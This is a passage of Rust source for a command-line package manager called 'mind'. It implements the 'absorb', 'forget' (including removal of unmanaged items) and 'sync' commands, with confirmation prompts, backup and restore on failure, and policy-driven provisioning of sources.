            dest_path: dest_item_path.to_string_lossy().into_owned(),
        });
    }

    // --- ABS-7 prompt (BEFORE moving/deleting anything) ---
    // One item may occupy multiple lobes. We absorb from the FIRST recorded path.
    // The remaining paths are "stray copies" that will be replaced by the managed
    // link after learn. We must remove them first (so learn can place the link).
    let source_lobe_path = item
        .paths
        .first()
        .ok_or_else(|| MindError::NotInstalled {
            name: item.key().into(),
        })?
        .clone();
    let stray_paths: Vec<&std::path::PathBuf> = item.paths.iter().skip(1).collect();

    if !yes {
        // Print what we will do.
        if !out.json {
            println!("absorb will:");
            // spec: DSC-95
            println!(
                "  move  {} -> {}",
                display_path(&source_lobe_path),
                display_path(&dest_item_path)
            );
            for stray in &stray_paths {
                println!("  delete (stray copy) {}", display_path(stray));
            }
        }
        // C3 / ABS-7: json mode is non-interactive; treat it like non-TTY for
        // the destructive confirmation. A missing --yes refuses with
        // ConfirmationRequired regardless of whether a real TTY is attached.
        if !crate::hook::is_tty() || out.json {
            // spec: CLI-232
            return Err(MindError::ConfirmationRequired {
                action: json_confirmation_action(
                    format!("absorbing {}", item.display_key()),
                    out.json,
                ),
            });
        }
        if !confirm("proceed with absorb?")? {
            println!("cancelled; nothing changed");
            return Ok(());
        }
    }

    // --- ABS-10: transactional destructive operations begin here ---
    //
    // The invariant: if anything fails before learn completes, the original
    // lobe entry must be restored exactly as it was and the manifest left
    // unchanged. We mirror the staging/backup pattern from src/install.rs:
    //
    //  1. Copy the lobe item into the destination convention path (do NOT
    //     remove the original yet; the original is still in the lobe).
    //  2. git add_all + commit in dest.
    //  3. meld dest if not yet registered.
    //  4. Stash a backup copy of the lobe item so we can restore it.
    //  5. Remove the original lobe entry (making room for learn's symlink).
    //  6. learn the item. On failure, restore the backup to source_lobe_path.
    //  7. On success, drop the backup; stray copies in other lobes were
    //     replaced by learn's managed symlinks (Clobber::Force).

    // 1. Copy lobe item to dest convention path.
    if let Some(parent) = dest_item_path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| MindError::io(parent, e))?;
    }
    if dest_item_path.exists() {
        // --force: remove existing dest content first so copy is clean.
        crate::install::remove_path(&dest_item_path)?;
    }
    copy_path_recursive(&source_lobe_path, &dest_item_path)?;

    // 2. ABS-5: stage and commit in the destination repo.
    let commit_msg = format!("absorb {}:{}", item.kind.as_str(), item.name);
    let git_err = (|| {
        crate::git::add_all(&dest_path)?;
        crate::git::commit(&dest_path, &commit_msg)
    })();
    if let Err(e) = git_err {
        // Restore: remove the dest copy we just made; source lobe is still intact.
        let _ = crate::install::remove_path(&dest_item_path);
        return Err(e);
    }

    // 3. ABS-1: meld the destination if not yet registered. Remember whether
    //    THIS call registered it, so a later learn failure can unwind the
    //    registration (ABS-12) without touching a pre-existing source.
    let dest_spec = dest_path.to_string_lossy().into_owned();
    let freshly_melded = !is_melded(paths, &dest_spec, None)?;
    if freshly_melded {
        let meld_err = meld(
            paths,
            &dest_spec,
            None,
            vec![],
            vec![],
            false,
            PinRequest::None,
            None,
            false,
            None, // absorb melds a directory, never an item link
        );
        if let Err(e) = meld_err {
            // Restore: source lobe still intact; clean up dest copy.
            let _ = crate::install::remove_path(&dest_item_path);
            return Err(e);
        }
        // meld() now returns MeldSummary; the Ok(_) case is discarded here
        // because absorb handles its own JSON output (ABS-11).
    }

    // 4. Backup the source lobe item before removing it.
    //    Use a tmp path under MIND_HOME so it survives an in-repo rename.
    let backup = paths
        .tmp_dir()
        .join("absorb-backup")
        .join(item.kind.as_str())
        .join(&item.name);
    let _ = crate::install::remove_path(&backup);
    if let Some(p) = backup.parent() {
        std::fs::create_dir_all(p).map_err(|e| MindError::io(p, e))?;
    }
    copy_path_recursive(&source_lobe_path, &backup)?;

    // 5. Remove the original lobe entry so learn can place its symlink there.
    if let Err(e) = crate::install::remove_path(&source_lobe_path) {
        // Couldn't clear path; restore is a no-op since lobe is still there.
        let _ = crate::install::remove_path(&backup);
        return Err(e);
    }

    // 6. Derive the effective name for reporting (destination prefix).
    let registry_for_prefix = Registry::load(paths)?;
    let effective_prefix = dest_source_prefix(&dest_path, &registry_for_prefix);
    let effective_name = crate::namespace::apply(&item.name, &effective_prefix);
    let effective_key = absorb_effective_key(item.kind, &effective_name);

    // ABS-1 / ABS-8: learn the item under the destination source.
    // When `--json` is in effect use `learn_collecting` (no JSON emitted by
    // learn itself) so that absorb can emit its own single result (ABS-11).
    // In human mode the regular `learn()` path prints the "learned ..." line.
    let dest_source_name = parse_spec(&dest_spec)
        .map(|s| s.name)
        .unwrap_or_else(|_| dest_spec.clone());
    let learn_ref = format!("{}:{}", item.kind.as_str(), effective_name);
    let qualified_ref = format!("{dest_source_name}#{learn_ref}");
    let learn_flow = InstallFlow {
        yes: true,               // already confirmed above
        clobber: Clobber::Force, // stray lobe copies handled by Force
        dangerously_skip: false,
        dangerously_skip_build: false,
    };
    let learn_err: Result<()> = if out.json {
        learn_collecting(paths, &qualified_ref, learn_flow).map(|_| ())
    } else {
        learn(paths, &qualified_ref, false, learn_flow)
    };

    if let Err(e) = learn_err {
        // Restore the original lobe entry from backup.
        // Best-effort: if restore fails we still return the original error.
        if let Some(parent) = source_lobe_path.parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        let _ = copy_path_recursive(&backup, &source_lobe_path);
        let _ = crate::install::remove_path(&backup);
        // spec: ABS-12 -- unwind a registration this call made (best-effort;
        // nothing was installed from it, learn failed) and name the dest
        // commit, which is left in place because the dest repo is the user's.
        if freshly_melded {
            let _ = unmeld_one(paths, &dest_source_name, false, true, false, None);
        }
        crate::render::warn(format!(
            "absorb left commit '{}' in {}; remove it with git if unwanted",
            strip_ansi(&commit_msg),
            display_path(&dest_path)
        ));
        return Err(e);
    }

    // 7. Success: drop the backup.
    let _ = crate::install::remove_path(&backup);

    if out.json {
        // ABS-11: emit exactly one structured result on stdout.
        let mut result = MutationResult::new("absorb", item_ref_str, "absorbed");
        result.key = Some(effective_key);
        return print_json(&result);
    }
    println!(
        "{} absorbed {} -> managed as {effective_key}",
        out.ok(),
        item.key().display()
    );
    Ok(())
}

/// Resolve the destination for `absorb` (ABS-2 / ABS-3).
///
/// Returns `(dest_path, interactive_dest)` where `interactive_dest` is true only
/// when the destination was obtained interactively (ABS-3), which triggers the
/// ABS-4 save offer.
fn resolve_absorb_dest(
    paths: &Paths,
    to_flag: Option<String>,
    yes: bool,
) -> Result<(std::path::PathBuf, bool)> {
    // ABS-2: --to flag takes precedence.
    if let Some(p) = to_flag {
        let path = expand_tilde(&p);
        return Ok((path, false));
    }

    // ABS-2: MIND_ABSORB_TO env var is next.
    if let Some(p) = std::env::var_os("MIND_ABSORB_TO") {
        let path = expand_tilde(&p.to_string_lossy());
        return Ok((path, false));
    }

    // ABS-2: absorb_to in config.toml.
    let config = Config::load(paths)?;
    if let Some(p) = config.absorb_to {
        let path = expand_tilde(&p);
        return Ok((path, false));
    }

    // ABS-3: none set and non-TTY (or --yes with no destination).
    if !crate::hook::is_tty() {
        return Err(MindError::ConfirmationRequired {
            action: "absorb (no destination configured; re-run with --to <path>)".to_string(),
        });
    }

    // Interactive: prompt, offering the built-in personal repo.
    let personal = paths.mind_home.join("personal");
    let personal_str = personal.to_string_lossy();
    let chosen = if yes {
        // With --yes, default to the built-in personal dir without prompting.
        personal.clone()
    } else {
        println!("No absorb destination configured.");
        println!("Enter a path, or press Enter to use the built-in: {personal_str}");
        print!("> ");
        let _ = std::io::stdout().flush();
        let mut line = String::new();
        std::io::stdin()
            .read_line(&mut line)
            .map_err(|e| MindError::io("<stdin>", e))?;
        let trimmed = line.trim();
        if trimmed.is_empty() {
            personal.clone()
        } else {
            expand_tilde(trimmed)
        }
    };

    // ABS-3: create and git-init the built-in personal repo on demand.
    if chosen == personal && !personal.exists() {
        if !out_ctx().json {
            println!(
                "Creating {} and initializing git repository",
                personal.display()
            );
        }
        crate::git::git_init(&personal)?;
    }

    Ok((chosen, true))
}

/// Offer to save the chosen absorb destination as `absorb_to` in config.toml (ABS-4).
/// Only called when the destination was resolved interactively.
fn offer_save_absorb_to(paths: &Paths, dest: &std::path::Path, yes: bool) -> Result<()> {
    if yes {
        // --yes skips the prompt; save automatically.
        let mut config = Config::load(paths)?;
        config.absorb_to = Some(dest.to_string_lossy().into_owned());
        paths.ensure_layout()?;
        config.save(paths)?;
        return Ok(());
    }
    if !crate::hook::is_tty() {
        // Non-TTY without --yes: skip (the destination was already used this run).
        return Ok(());
    }
    print!(
        "\nSave '{}' as absorb_to in config.toml? [y/N] ",
        dest.display()
    );
    let _ = std::io::stdout().flush();
    let mut line = String::new();
    std::io::stdin()
        .read_line(&mut line)
        .map_err(|e| MindError::io("<stdin>", e))?;
    if parse_confirm(&line, false) {
        let mut config = Config::load(paths)?;
        config.absorb_to = Some(dest.to_string_lossy().into_owned());
        paths.ensure_layout()?;
        config.save(paths)?;
        println!("Saved absorb_to = '{}'", dest.display());
    }
    Ok(())
}

/// Thin output-ctx accessor for code that cannot use the `out` binding directly.
fn out_ctx() -> crate::render::OutputCtx {
    crate::render::ctx()
}

/// Recursively copy `src` to `dst` (file or directory).
fn copy_path_recursive(src: &std::path::Path, dst: &std::path::Path) -> Result<()> {
    if src.is_dir() {
        std::fs::create_dir_all(dst).map_err(|e| MindError::io(dst, e))?;
        let rd = std::fs::read_dir(src).map_err(|e| MindError::io(src, e))?;
        for entry in rd.flatten() {
            let from = entry.path();
            let to = dst.join(entry.file_name());
            copy_path_recursive(&from, &to)?;
        }
    } else {
        std::fs::copy(src, dst).map_err(|e| MindError::io(src, e))?;
    }
    Ok(())
}

/// Expand a leading `~` in `path` to the home directory.
fn expand_tilde(path: &str) -> std::path::PathBuf {
    if path == "~" {
        return dirs::home_dir().unwrap_or_else(|| std::path::PathBuf::from("~"));
    }
    if let Some(rest) = path.strip_prefix("~/")
        && let Some(home) = dirs::home_dir()
    {
        return home.join(rest);
    }
    std::path::PathBuf::from(path)
}

/// `mind forget <item>` — uninstall one item, or many via a glob.
///
/// When `unmanaged` is true, removal is scoped to unmanaged lobe items only
/// (UNM-7/UNM-8). `item_ref` may be `None` to remove every unmanaged item.
/// When `unmanaged` is false, behavior is unchanged: `item_ref` is required.
pub fn forget(
    paths: &Paths,
    item_ref: Option<&str>,
    unmanaged: bool,
    yes: bool,
    force: bool,
    dangerously_skip: bool,
) -> Result<()> {
    if unmanaged {
        return forget_unmanaged_bulk(paths, item_ref, yes);
    }

    // `unmanaged` is false: clap guarantees `item_ref` is Some (required_unless_present).
    let item_ref = item_ref.expect("item_ref required when --unmanaged is not set");

    let out = crate::render::ctx();
    let mut manifest = Manifest::load(paths)?;
    let parsed = parse_item_ref(item_ref)?;

    // A glob uninstalls every installed match (mirroring `learn`'s selection);
    // an exact ref honors the kind prefix and source qualifier and errors on an
    // ambiguous bare name (e.g. one shared by a skill and an agent).
    let keys: Vec<String> = if is_glob(&parsed.name) {
        let matches = select_installed(&manifest.items, &parsed);
        if matches.is_empty() {
            return Err(MindError::NotInstalled {
                name: parsed.name.clone(),
            });
        }
        matches.iter().map(|it| it.key().into()).collect()
    } else {
        match crate::resolve::resolve_installed(&manifest.items, &parsed) {
            Ok(it) => vec![it.key().into()],
            // UNM-4: an exact ref that names no managed item may name an
            // unmanaged lobe item; a glob never sweeps unmanaged entries.
            Err(MindError::NotInstalled { .. }) => {
                let unmanaged_items = crate::unmanaged::scan(paths, &manifest)?;
                let item = crate::unmanaged::resolve(&unmanaged_items, &parsed)?;
                return forget_unmanaged_single(item, yes);
            }
            Err(e) => return Err(e),
        }
    };

    // CLI-42: removing more than one item (typically a glob that matched more
    // broadly than intended) lists the matches and confirms first. `--yes` skips;
    // a non-TTY run without `--yes` refuses rather than removing silently.
    if keys.len() > 1 && !yes {
        if !out.json {
            println!("forget would remove {} item(s):", keys.len());
            for key in &keys {
                // spec: DSC-95
                println!("  {} {}", out.warn(), crate::sanitize::strip_ansi(key));
            }
        }
        // spec: LIFE-45 -- B1: `--json` is non-interactive (mirrors DEP-60).
        if !crate::hook::is_tty() || out.json {
            // spec: CLI-232
            return Err(MindError::ConfirmationRequired {
                action: json_confirmation_action(
                    format!("removing {} items", keys.len()),
                    out.json,
                ),
            });
        }
        // `out.json` already returned above; this branch is TTY-only.
        if !confirm("remove these item(s)?")? {
            println!("cancelled; nothing removed");
            return Ok(());
        }
    }

    // HOOK-82/86: an item's uninstall hooks (when declared) run before its files
    // are removed, in declaration order. They are read from the live source
    // catalog (nothing is recorded for them, HOOK-84); a source no longer
    // registered or an item gone from its catalog yields no hook, and removal
    // proceeds.
    let registry = Registry::load(paths)?;
    let catalog = catalog::scan(paths, &registry).unwrap_or_default();

    // DEP-60: for a single-item forget, warn about installed items that depend on
    // the item being removed. The check only applies to the single-item path
    // (keys.len() == 1); the glob path already handled its CLI-42 confirmation.
    if keys.len() == 1 {
        let removed_key = &keys[0];
        // Match by stable identity (source as well as key): a key-only match
        // would pick up an uninstalled same-key twin from another source.
        let graph = crate::deps::installed_graph(
            &catalog,
            |it| {
                manifest
                    .items
                    .get(it.key().as_str())
                    .is_some_and(|m| m.source == it.source)
            },
            read_item_text,
        );
        let dependents = graph.dependents(removed_key);
        if !dependents.is_empty() && !yes && !force {
            // spec: DSC-95 -- sanitize each field before composing, not
            // the finished line.
            let removed_display = crate::sanitize::strip_ansi(removed_key);
            if !out.json {
                println!(
                    "{} removing {removed_display} will break the following installed items that depend on it:",
                    out.warn()
                );
                for dep in &dependents {
                    println!("  {}", crate::sanitize::strip_ansi(dep));
                }
            }
            // C3 / DEP-60: json mode is non-interactive; treat it like non-TTY
            // for this destructive confirmation. A missing --yes/--force refuses
            // with ConfirmationRequired regardless of whether a real TTY is attached.
            if !crate::hook::is_tty() || out.json {
                // spec: CLI-232
                return Err(MindError::ConfirmationRequired {
                    action: json_confirmation_action(
                        format!(
                            "removing {removed_display} (has {} dependent(s))",
                            dependents.len()
                        ),
                        out.json,
                    ),
                });
            }
            if !confirm("remove anyway?")? {
                println!("cancelled; nothing removed");
                return Ok(());
            }
        }
    }

    let mut removed: Vec<String> = Vec::new();
    // spec: CLI-226 -- a BTreeSet (not HashSet) so the per-source forget hints
    // below print in a deterministic order rather than HashSet's random
    // iteration order.
    let mut removed_sources: BTreeSet<String> = BTreeSet::new();
    for key in keys {
        let item = manifest.items.remove(&key).expect("key from manifest");
        let uninstall_hooks: Vec<&crate::mindfile::ResolvedHook> =
            item_catalog_match(&catalog, &item)
                .map(|c| c.uninstall_hooks())
                .unwrap_or_default();
        let commit = registry
            .find(&item.source)
            .and_then(|s| s.commit.clone())
            .unwrap_or_default();
        // A hook failure stops here, leaving this item (and the rest) installed;
        // the manifest is saved with what remains.
        if let Err(e) = uninstall_item(paths, &item, &uninstall_hooks, &commit, dangerously_skip) {
            manifest.items.insert(key.clone(), item);
            // spec: LIFE-48 -- a save failure here must not mask `e`.
            if let Err(se) = manifest.save(paths) {
                warn_manifest_save_also_failed(&se);
            }
            return Err(e);
        }
        removed_sources.insert(item.source.clone());
        // spec: DSC-95 -- the display copy pushed for `--json`'s
        // `removed` array and the human line are sanitized; `key` itself stays
        // raw (used above to key `manifest.items`).
        let key_display = crate::sanitize::strip_ansi(&key);
        removed.push(key_display.clone());
        if !out.json {
            println!("{} forgot {key_display}", out.ok());
        }
    }
    manifest.save(paths)?;
    // spec: LNK-5 -- a forget that empties an item-link instance leaves it
    // registered; point at `unmeld` to drop the source itself.
    for src_name in &removed_sources {
        if registry
            .find(src_name)
            .is_some_and(|s| s.item_path.is_some())
            && !manifest.items.values().any(|it| &it.source == src_name)
        {
            // spec: CLI-225 -- `src_name` is an item-link source identity,
            // which `is_safe_manifest_path` allows to carry a `'` (via the
            // `#<path>` segment), so a bare single-quote frame breaks out.
            // Route through `shell_quote` (which supplies its own quoting)
            // instead of hand-framing it.
            let quoted_src = crate::error::shell_quote(src_name);
            eprintln!(
                "hint: item link {src_name} has nothing installed; run `mind unmeld {quoted_src}` to drop it"
            );
        }
    }
    if out.json {
        let mut result = MutationResult::new("forget", item_ref, "removed");
        result.removed = removed;
        return print_json(&result);
    }
    Ok(())
}

/// `forget` of a single unmanaged lobe item (UNM-4/5): remove the lobe entry
/// itself after a prompt that states it is not managed by mind. There is no
/// store copy or manifest entry, so the manifest is left untouched.
fn forget_unmanaged_single(item: &crate::unmanaged::UnmanagedItem, yes: bool) -> Result<()> {
    let out = crate::render::ctx();
    // spec: DSC-95 -- sanitize each path before joining, not the
    // joined string after (an unterminated escape in one path would
    // otherwise consume the remaining paths in the list).
    let where_ = item
        .paths
        .iter()
        .map(|p| display_path(p))
        .collect::<Vec<_>>()
        .join(", ");
    // UNM-5: always state explicitly that the item is not mind-managed and that
    // removal deletes the user's own file or directory. This is the disclosure
    // that immediately precedes deletion of the user's OWN files, so it must
    // use the sanitized key like every other print site (DSC-95).
    if !out.json {
        println!(
            "{} {} is not managed by mind: it is your own file or directory at {where_}, not a mind install. Removing it deletes it.",
            out.warn(),
            item.display_key()
        );
    }
    if !yes {
        // spec: LIFE-45 -- B1: `--json` is non-interactive (mirrors DEP-60);
        // this is the worst-case site (UNM-5): without this, `--json` on a TTY
        // would delete the user's own unmanaged file with zero consent.
        if !crate::hook::is_tty() || out.json {
            // spec: DSC-95
            return Err(MindError::ConfirmationRequired {
                action: json_confirmation_action(
                    format!("removing unmanaged {}", item.display_key()),
                    out.json,
                ),
            });
        }
        if !confirm("remove this unmanaged item?")? {
            println!("cancelled; nothing removed");
            return Ok(());
        }
    }
    for p in &item.paths {
        crate::install::remove_path(p)?;
    }
    if out.json {
        let mut result = MutationResult::new("forget", &item.display_key(), "removed");
        result.removed = vec![item.display_key()];
        return print_json(&result);
    }
    println!("{} forgot {} (unmanaged)", out.ok(), item.display_key());
    Ok(())
}

/// `forget --unmanaged [<ref>]` — bulk removal of unmanaged lobe items (UNM-7/8).
///
/// Selects every unmanaged item matching the optional `item_ref` (`None` = all),
/// lists them, confirms once (stating they are not managed and deletion is real),
/// then removes each. The manifest is never mutated (UNM-4).
// spec: UNM-7 UNM-8
fn forget_unmanaged_bulk(paths: &Paths, item_ref: Option<&str>, yes: bool) -> Result<()> {
    let out = crate::render::ctx();
    let manifest = Manifest::load(paths)?;
    let scanned = crate::unmanaged::scan(paths, &manifest)?;

    // Parse the ref (if given) and select matching items.
    let parsed = item_ref.map(parse_item_ref).transpose()?;
    let matched = crate::unmanaged::select(&scanned, parsed.as_ref());

    let sentinel = item_ref.unwrap_or("*");
    if matched.is_empty() {
        return Err(MindError::NotInstalled {
            name: sentinel.to_string(),
        });
    }

    // UNM-8: list the matched items, then a SINGLE confirm stating they are not
    // managed by mind and that removal deletes the user's own files/directories.
    if !out.json {
        println!(
            "{} forget --unmanaged would remove {} unmanaged item(s):",
            out.warn(),
            matched.len()
        );
        for item in &matched {
            println!("  {} {}", out.warn(), item.display_key());
        }
        println!(
            "{} these items are NOT managed by mind: removing them deletes your own files or directories, not symlinks.",
            out.warn()
        );
    }
    if !yes {
        // spec: LIFE-45 -- B1: `--json` is non-interactive (mirrors DEP-60).
        if !crate::hook::is_tty() || out.json {
            // spec: CLI-232
            return Err(MindError::ConfirmationRequired {
                action: json_confirmation_action(
                    format!("removing {} unmanaged items", matched.len()),
                    out.json,
                ),
            });
        }
        if !confirm("remove these unmanaged items?")? {
            println!("cancelled; nothing removed");
            return Ok(());
        }
    }

    // Remove each matched item's paths. The manifest is NOT mutated (UNM-4).
    let mut removed: Vec<String> = Vec::new();
    for item in &matched {
        for p in &item.paths {
            crate::install::remove_path(p)?;
        }
        removed.push(item.display_key());
        if !out.json {
            println!("{} forgot {} (unmanaged)", out.ok(), item.display_key());
        }
    }

    if out.json {
        let mut result = MutationResult::new("forget", sentinel, "removed");
        result.removed = removed;
        return print_json(&result);
    }
    Ok(())
}

/// `mind sync [--upgrade] [--dangerously-skip-install-hook-check]
/// [--dangerously-skip-build-hook-check]` — fetch every source and refresh its
/// recorded commit. With `--upgrade`, an `upgrade` pass runs after the refresh
/// (reporting pending upgrades and prompting before applying, exactly like
/// `mind upgrade`), so one command both fetches upstream and applies pending
/// upgrades. Both `dangerously_skip_hook_check` and
/// `dangerously_skip_build_hook_check` are forwarded to the `upgrade` pass so
/// hooks can run unattended in CI; they are unused when `--upgrade` is absent.
///
/// spec: LIFE-49 -- M1: `yes` is the same global `--yes` the CLI already
/// threads into `mind upgrade`/`mind forget`; it is forwarded to the
/// `--upgrade` pass's `upgrade_inner` call below instead of being hardcoded to
/// `false`, so `sync --upgrade --yes` (and, since B1/LIFE-45, `sync --upgrade
/// --json --yes`) actually skips the confirmation instead of silently
/// cancelling or refusing.
/// `mind sync` over ALL sources: the historical entry point, kept for callers
/// that never scope the sync (e.g. the TUI's sync action). Delegates to
/// [`sync_with_selector`] with no selector.
pub fn sync(
    paths: &Paths,
    then_upgrade: bool,
    yes: bool,
    dangerously_skip_hook_check: bool,
    dangerously_skip_build_hook_check: bool,
) -> Result<()> {
    sync_with_selector(
        paths,
        None,
        then_upgrade,
        yes,
        dangerously_skip_hook_check,
        dangerously_skip_build_hook_check,
    )
}

/// `mind sync [source]` — refresh melded source clones and catalogs. With a
/// `[source]` selector, only matching sources are fetched (CLI-231); with none,
/// every source is (CLI-50).
pub fn sync_with_selector(
    paths: &Paths,
    source_selector: Option<&str>,
    then_upgrade: bool,
    yes: bool,
    dangerously_skip_hook_check: bool,
    dangerously_skip_build_hook_check: bool,
) -> Result<()> {
    let out = crate::render::ctx();
    // spec: CLI-231 -- a `[source]` selector narrows the sync to matching
    // sources; validate a glob selector up front so a malformed pattern reports
    // cleanly rather than silently matching nothing.
    if let Some(sel) = source_selector {
        crate::resolve::validate_source_selector(sel)?;
    }
    // POL-3: load the managed policy once (fail closed on Err; None = inert).
    let policy = Policy::load()?;
    // CLI-19: auto-meld honors the user's SSH preference too.
    let prefer_ssh = Config::load(paths)?.ssh;
    let mut registry = Registry::load(paths)?;
    let mut sync_skipped: Vec<SkippedEntry> = Vec::new();
    // spec: POL-34 -- provisioning failures are soft; collect them here so the
    // per-source sync loop still runs and they are reported at the end.
    let mut provision_failures: Vec<String> = Vec::new();
    // spec: CLI-217 POL-58 -- keys installed by the auto_meld provisioning pass,
    // reported in sync's own result object rather than by a `learn` document per
    // item.
    let mut provisioned_keys: Vec<String> = Vec::new();

    // POL-32: provision the policy's auto-meld base set before syncing. Each entry
    // not already in the registry is melded at its declared pin; an entry already
    // present is left unchanged (idempotent). Reuses the meld path, so auto-meld
    // entries discover nested sources just like a user meld. Entries satisfy
    // allow/pinned by policy validation (POL-21/POL-31), so they pass the meld
    // enforcement above.
    //
    // spec: CLI-231 -- a targeted `sync <source>` fetches only the named
    // source(s); the whole-set operations (policy auto-meld provisioning here, and
    // the DSC-57 nested re-walk below) are skipped so a scoped sync stays scoped.
    if let Some(policy) = policy.as_ref().filter(|_| source_selector.is_none()) {
        paths.ensure_layout()?;
        let mut visited = HashSet::new();
        let mut provisioned = 0usize;
        for am in policy.auto_meld() {
            // Determine which of three outcomes this entry reaches, computing
            // whether the source ends this sync registered.  Using a labeled block
            // lets all three branches fall through to the common install pass below
            // rather than `continue`-ing past it.
            //
            //   - registered at declared pin (POL-32)  -> confirmed registered
            //   - registered at different pin (POL-55) -> re-pinned, confirmed registered
            //   - not yet registered                   -> meld_recursive -> registered or failure
            //
            // (meld_recursive also skips a same-URL duplicate, but checking here
            // avoids the clone attempt and the "melding ..." chatter.)
            let source_registered: bool = 'registered: {
                // spec: CLI-216 -- "is this policy entry already registered?" is
                // a question; the meld_recursive call below is what decides a
                // reading and clones.
                if let Ok(spec) = parse_spec_quiet(&am.repo)
                    && let Some(src) = registry.sources.iter_mut().find(|s| s.name == spec.name)
                {
                    let old_pin = src.pin.clone();
                    if old_pin == am.pin {
                        // spec: POL-32 -- already at the declared pin; confirmed registered.
                        break 'registered true;
                    }
                    // spec: POL-55 -- pin drift: update the recorded pin so the
                    // per-source sync fetch below lands the new ref.
                    src.pin = am.pin.clone();
                    provisioned += 1; // mark registry dirty to trigger save below
                    if !out.json {
                        println!(
                            "  {} re-pinned {} {} -> {}",
                            out.ok(),
                            spec.name,
                            pin_description(&old_pin),
                            pin_description(&am.pin),
                        );
                    }
                    break 'registered true;
                }
                // spec: POL-34 -- soft-fail: warn and continue so already-melded
                // sources still sync; record the failure for the final exit-code check.
                // spec: POL-35 -- snapshot registry length before the call so any
                // sources pushed by a partially-failing meld_recursive can be rolled
                // back, preventing a subsequent save from persisting a partial entry.
                let snapshot_len = registry.sources.len();
                match meld_recursive(
                    paths,
                    &mut registry,
                    &am.repo,
                    None,
                    vec![],
                    vec![],
                    false, // no consumer --flat-skills for an auto-melded source
                    PinRequest::Follow(am.pin.clone()), // POL-55: apply the policy pin verbatim
                    false, // skip (not error) if a same-URL entry is already present
                    &mut visited,
                    Some(policy),
                    None,  // auto-meld supplies no install hook
                    false, // auto-meld is non-TTY, so its hooks take the HOOK-22 skip path
                    prefer_ssh,
                    true, // auto-meld is non-interactive (no collision prompt)
                    None, // auto-meld has no curator-supplied configuration
                    &mut sync_skipped,
                    None, // a policy auto-meld names a repo, never an item link
                    None, // provisioned by policy, not by a curator (STO-82)
                ) {
                    Ok(n) => {
                        provisioned += n;
                        break 'registered true;
                    }
                    Err(e) => {
                        // spec: POL-35 -- roll back any partial registry push from
                        // this entry so the save below does not persist it.
                        registry.sources.truncate(snapshot_len);
                        if !out.json {
                            eprintln!(
                                "  {} auto_meld provisioning failed for '{}': {e}",
                                out.warn(),
                                am.repo
                            );
                        }
                        provision_failures.push(am.repo.clone());
                        break 'registered false;
                    }
                }
            };
            // spec: POL-58 -- install pass: runs for ALL registered outcomes
            // (fresh meld, same-pin idempotent confirmation, or re-pin reconciliation)
            // so a machine that was register-only and later gains `install = true`
            // converges on the next sync.  The per-item skip inside
            // `install_provisioned_items` (`installed.contains(&key)`) makes repeat
            // syncs idempotent: already-installed items are skipped without error.
            if am.install && source_registered {
                // spec: CLI-216 -- identity of an entry that is already melded.
                if let Ok(spec) = parse_spec_quiet(&am.repo) {
                    // Save the registry first so the install pass can read
                    // the newly registered source from disk.
                    if provisioned > 0 {
                        if let Err(e) = registry.save(paths) {
                            provision_failures.push(am.repo.clone());
                            if !out.json {
                                eprintln!(
                                    "  {} auto_meld registry save failed before install for '{}': {e}",
                                    out.warn(),
                                    am.repo
                                );
                            }
                            provisioned = 0; // reset so we don't double-save
                            continue;
                        }
                        provisioned = 0; // already saved
                    }
                    // spec: POL-60 -- per-item failures are soft: warn,
                    // record, continue; do not abort remaining items or
                    // other sources.
                    let (keys, item_failures) =
                        install_provisioned_items(paths, &spec.name, am.run_build_hooks);
                    // spec: CLI-217 -- folded into sync's ONE result object
                    // below instead of each item emitting its own.
                    provisioned_keys.extend(keys);
                    for (key, e) in item_failures {
                        if !out.json {
                            eprintln!(
                                "  {} auto_meld item install failed for '{}' ({}): {e}",
                                out.warn(),
                                am.repo,
                                key,
                            );
                        }
                        provision_failures.push(format!("{}:{}", am.repo, key));
                    }
                }
            }
        }
        if provisioned > 0 {
            registry.save(paths)?;
        }
    }

    // spec: POL-34 -- only treat an empty registry as a no-op when there are also
    // no provisioning failures to report; otherwise fall through so the failures
    // are collected and the command exits non-zero.
    if registry.sources.is_empty() && provision_failures.is_empty() {
        if out.json {
            return print_json(&MutationResult::new("sync", "", "no-op"));
        }
        // spec: CLI-187
        println!("no sources melded; run `mind meld <owner/repo>` to add one");
        return Ok(());
    }
    // spec: CLI-231 -- resolve a `[source]` selector to the set of matching
    // source names. A selector that matches nothing (against a non-empty
    // registry) is a SourceNotFound, so a typo is reported rather than silently
    // syncing nothing. With no selector, every source is in scope (CLI-50).
    let selected: Option<Vec<String>> = match source_selector {
        Some(sel) => {
            let names: Vec<String> = registry
                .sources
                .iter()
                .filter(|s| crate::resolve::source_matches_glob(&s.name, sel))
                .map(|s| s.name.clone())
                .collect();
            if names.is_empty() {
                return Err(MindError::SourceNotFound {
                    name: sel.to_string(),
                });
            }
            Some(names)
        }
        None => None,
    };
    let in_scope = |name: &str| {
        selected
            .as_ref()
            .is_none_or(|ns| ns.iter().any(|n| n == name))
    };

    // A per-source failure (e.g. a network error on one remote) must not abort
    // the whole run: refresh each source independently, persist whatever
    // progress was made, then report the failures and exit non-zero.
    let total = selected.as_ref().map_or(registry.sources.len(), Vec::len);
    let mut failures: Vec<String> = Vec::new();
    let mut synced = 0usize;
    for source in &mut registry.sources {
        // spec: CLI-231 -- skip sources outside a `[source]` selector's scope.
        if !in_scope(&source.name) {
            continue;
        }
        // POL-12: with the allowlist locked, do not sync a source whose identity
        // is no longer allowed; report and skip it (the rest still sync).
        if let Some(policy) = policy.as_ref()
            && policy.lock()
            && !policy.allow_matches(&source.base_identity())
        {
            if !out.json {
                println!(
                    "{} skipping {}: source not permitted by the managed policy's allowlist",
                    out.warn(),
                    source.name
                );
            }
            continue;
        }
        if !out.json {
            print!("{} syncing {} ... ", out.bullet(), source.name);
            let _ = std::io::stdout().flush();
        }
        let refreshed = (|| -> Result<(String, bool, Option<String>)> {
            // spec: STO-69 -- validate before any fetch/clone/delete touches it.
            let dir = clone_dir_checked(paths, source)?;
            // A linked (no-pin) local source is its live working tree (CLI-27):
            // there is nothing to fetch and the tree is never touched. Just re-read
            // its HEAD (best effort) and description. A pinned local source is a
            // clone and syncs like any other.
            if source.is_linked() {
                // The working tree must still exist; a deleted one is a sync error
                // for this source (CLI-54 reports it and continues with the rest).
                if !dir.is_dir() {
                    return Err(MindError::NotADirectory {
                        path: dir.display().to_string(),
                    });
                }
                let new_commit = git::head_commit(&source.url, &dir)
                    .ok()
                    .or_else(|| source.commit.clone())
                    .unwrap_or_default();
                let changed = source.commit.as_deref() != Some(new_commit.as_str());
